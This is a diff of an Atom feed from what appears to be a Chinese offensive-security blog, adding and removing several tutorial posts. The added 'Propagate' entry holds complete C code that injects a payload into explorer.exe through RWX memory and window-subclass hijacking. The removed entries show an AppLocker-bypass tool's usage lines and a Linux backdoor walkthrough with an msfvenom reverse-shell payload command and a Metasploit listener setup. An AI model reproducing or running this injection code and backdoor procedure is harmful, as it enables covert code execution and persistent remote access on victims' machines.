@@ -57,6 +57,46 @@
   </entry>
   
   <entry>
+    <title>Propagate</title>
+    <link href="www.ggsec.cn/propagate.html"/>
+    <id>www.ggsec.cn/propagate.html</id>
+    <published>2018-09-04T11:51:47.000Z</published>
+    <updated>2018-09-04T12:52:51.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="http://oc78wb8cz.bkt.clouddn.com/DF31317B9D858CFDD64A2D5AB8B8ACBD.jpg" alt="enter description here"><br><a id="more"></a><br><a href="https://github.com/odzhan/injection" target="_blank" rel="noopener">https://github.com/odzhan/injection</a><br><a href="https://modexp.wordpress.com/2018/08/23/process-injection-propagate/" target="_blank" rel="noopener">https://modexp.wordpress.com/2018/08/23/process-injection-propagate/</a></p><p>它适用于Windows 7和10，但不执行错误检查，因此可能导致explorer.exe崩溃或其他一些意外行为。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">VOID propagate(LPVOID payload, DWORD payloadSize) &#123;</span><br><span class="line">    HANDLE          hp, p;</span><br><span class="line">    DWORD           id;</span><br><span class="line">    HWND            pwh, cwh;</span><br><span class="line">    SUBCLASS_HEADER sh;</span><br><span class="line">    LPVOID          psh, pfnSubclass;</span><br><span class="line">    SIZE_T          rd,wr;</span><br><span class="line">    <span class="comment">// 1.获取父窗口句柄 </span></span><br><span class="line">    pwh = FindWindow(L"Progman", NULL);</span><br><span class="line">    <span class="comment">//2.获取子窗口句柄 </span></span><br><span class="line">    cwh = FindWindowEx(pwh, NULL, L"SHELLDLL_DefView", NULL);</span><br><span class="line">    <span class="comment">// 3.获取子类标题的句柄 </span></span><br><span class="line">    p = GetProp(cwh, L"UxSubclassInfo");</span><br><span class="line">    <span class="comment">// 4.获取explorer.exe的进程ID </span></span><br><span class="line">    GetWindowThreadProcessId(cwh, &amp;id);</span><br><span class="line">    <span class="comment">// 打开explorer.exe </span></span><br><span class="line">    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);</span><br><span class="line">    <span class="comment">//6.读取当前子类标题</span></span><br><span class="line">    ReadProcessMemory(hp, (LPVOID)p, &amp;sh, sizeof(sh), &amp;rd);</span><br><span class="line">    <span class="comment">// 7.为新的子类标题分配RW内存 </span></span><br><span class="line">    psh = VirtualAllocEx(hp, NULL, sizeof(sh),</span><br><span class="line">        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="comment">//8.为有效负载分配RWX内存</span></span><br><span class="line">    pfnSubclass = VirtualAllocEx(hp, NULL, payloadSize,</span><br><span class="line">        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">// 9. 将payload写入内存</span></span><br><span class="line">    WriteProcessMemory(hp, pfnSubclass,</span><br><span class="line">        payload, payloadSize, &amp;wr);</span><br><span class="line">    <span class="comment">// 10.将pfnSubclass字段设置为有效负载地址，并将</span></span><br><span class="line">    <span class="comment">// 写回到处理内存 </span></span><br><span class="line">    sh.CallArray[0].pfnSubclass = (SUBCLASSPROC)pfnSubclass;</span><br><span class="line">    WriteProcessMemory(hp, psh, &amp;sh, sizeof(sh), &amp;wr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 11.使用SetProp </span></span><br><span class="line">    SetProp(cwh, L"UxSubclassInfo", psh);</span><br><span class="line">    <span class="comment">// 12.触发经由窗口消息payload</span></span><br><span class="line">    PostMessage(cwh, WM_CLOSE, 0, 0);</span><br><span class="line">    <span class="comment">// 13.恢复原始子类标题</span></span><br><span class="line">    SetProp(cwh, L"UxSubclassInfo", p);</span><br><span class="line">    <span class="comment">// 14.可用内存和关闭句柄</span></span><br><span class="line">    VirtualFreeEx(hp, psh, 0, MEM_DECOMMIT | MEM_RELEASE);</span><br><span class="line">    VirtualFreeEx(hp, pfnSubclass, 0, MEM_DECOMMIT | MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;http://oc78wb8cz.bkt.clouddn.com/DF31317B9D858CFDD64A2D5AB8B8ACBD.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
+    
+    
+      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ghost_tunnel</title>
+    <link href="www.ggsec.cn/Ghost-tunnel.html"/>
+    <id>www.ggsec.cn/Ghost-tunnel.html</id>
+    <published>2018-09-04T11:51:17.000Z</published>
+    <updated>2018-09-04T13:01:27.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="http://oc78wb8cz.bkt.clouddn.com/IMG_20180904_195606.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/ghostunnel.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><p><a href="https://github.com/360PegasusTeam/GhostTunnel" target="_blank" rel="noopener">https://github.com/360PegasusTeam/GhostTunnel</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;http://oc78wb8cz.bkt.clouddn.com/IMG_20180904_195606.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>ALPC_EXP</title>
     <link href="www.ggsec.cn/ALPC-EXP.html"/>
     <id>www.ggsec.cn/ALPC-EXP.html</id>
@@ -393,50 +433,6 @@
     
     
       <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>secist_Apploacker_bypass</title>
-    <link href="www.ggsec.cn/secist-Apploacker-bypass.html"/>
-    <id>www.ggsec.cn/secist-Apploacker-bypass.html</id>
-    <published>2018-01-31T14:30:22.000Z</published>
-    <updated>2018-07-01T06:44:03.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="http://oc78wb8cz.bkt.clouddn.com/IMG_20180131_223511.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/secist_attack.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><p>Github :<a href="https://github.com/demonsec666/Secist_Applocker" target="_blank" rel="noopener">https://github.com/demonsec666/Secist_Applocker</a></p><pre><code>-c, --csc:            &lt;path&gt;    Example:  Secist_Attack.exe -c |or  --csc C:\Users\demon\secist.cs |and run secist.exe-C, --cscript:        &lt;path&gt;    Example:  Secist_Attack.exe -C |or  --cscript  C:\Users\demon\Payload\secist.txt-m, --msbuild:        &lt;path&gt;    Example:  Secist_Attack.exe -m |or  --msbuild  C:\Users\demon\Payload\secist.csproj-i, --cl_invocation:  &lt;Command&gt; Example:  Secist_Attack.exe -i |or  --cl_invocation  calc.exe                                                                  Secist_Attack.exe -i &quot;powershell.exe  calc&quot;-p, --pcalua:         &lt;APP&gt;     Example:  Secist_Attack.exe -p |or  --pcalua  calc.exe-l, --control:        &lt;DLL&gt;     Example:  Secist_Attack.exe -l |or  --control C:\Users\demon\example\runcalc.dll-A, --Applocker:      &lt;shell&gt;   Example:  Secist_Attack.exe -A |or  --Applocker-h, --help:           &lt;help&gt;    Example:  Secist_Attack.exe -h |or  --help     &lt;show help&gt;</code></pre><p><img src="http://oc78wb8cz.bkt.clouddn.com/1517410172598.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://oc78wb8cz.bkt.clouddn.com/1517410332606.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://oc78wb8cz.bkt.clouddn.com/1517410192976.jpg" alt="enter description here"><br>&nbsp;</p><p><img src="http://oc78wb8cz.bkt.clouddn.com/1517410258909.jpg" alt="enter description here"></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;http://oc78wb8cz.bkt.clouddn.com/IMG_20180131_223511.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
-    
-    
-      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Vegile_Linux_Backdoor</title>
-    <link href="www.ggsec.cn/Vegile-Linux-Backdoor.html"/>
-    <id>www.ggsec.cn/Vegile-Linux-Backdoor.html</id>
-    <published>2018-01-19T16:27:15.000Z</published>
-    <updated>2018-01-20T10:54:38.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/3A4BDF482B386E4C1B18FB9DA91E478A.png" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/Vegile_Linux_Backdoor.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/Screetsec/Vegile.git</span></span><br><span class="line">cd Vegile</span><br><span class="line">chmod +x Vegile</span><br></pre></td></tr></table></figure><p><img src="http://ojg8j426f.bkt.clouddn.com/1516444135450.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="Vegile帮助参数"><a href="#Vegile帮助参数" class="headerlink" title="Vegile帮助参数"></a>Vegile帮助参数</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vegile -<span class="selector-tag">i</span> / --inject [backdoor/rootkit]  (注入)</span><br><span class="line">Vegile -u / --unlimited [backdoor/rootkit] （无数次）</span><br><span class="line">Vegile -h / --help</span><br></pre></td></tr></table></figure><h2 id="1-首先生成linux-木马"><a href="#1-首先生成linux-木马" class="headerlink" title="1.首先生成linux 木马"></a>1.首先生成linux 木马</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -<span class="selector-tag">a</span> x86 --platform linux -<span class="selector-tag">p</span> linux/x86/shell/reverse_tcp LHOST=IP LPORT=PORT -<span class="selector-tag">b</span> <span class="string">"\x00"</span> -f elf -o NAME_BACKDOOR</span><br></pre></td></tr></table></figure><p><img src="http://ojg8j426f.bkt.clouddn.com/1516444270799.jpg" alt="enter description here"></p><h2 id="2-建立监听"><a href="#2-建立监听" class="headerlink" title="2.建立监听"></a>2.建立监听</h2><p>handler.rc<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD linux/x86/shell/reverse_tcp</span><br><span class="line">set LHOST  <span class="number">192.168</span>.<span class="number">1.100</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><p><img src="http://ojg8j426f.bkt.clouddn.com/1516444382477.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -r handler.rc</span><br></pre></td></tr></table></figure><p><img src="http://ojg8j426f.bkt.clouddn.com/1516445509621.jpg" alt="enter description here"><br>  得到一次会话<br><img src="http://ojg8j426f.bkt.clouddn.com/1516445482085.jpg" alt="enter description here"></p><h2 id="得到会话"><a href="#得到会话" class="headerlink" title="得到会话"></a>得到会话</h2><p>并无限制的发送会话<br><img src="http://ojg8j426f.bkt.clouddn.com/1516445549295.jpg" alt="enter description here"><br>包括把整个文件夹删除 还在 无限制的发送会话<br><img src="http://ojg8j426f.bkt.clouddn.com/1516444498027.jpg" alt="enter description here"></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/3A4BDF482B386E4C1B18FB9DA91E478A.png&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Metasploit" scheme="www.ggsec.cn/categories/Metasploit/"/>
-    
-    
-      <category term="Metasploit" scheme="www.ggsec.cn/tags/Metasploit/"/>
     
   </entry>
   
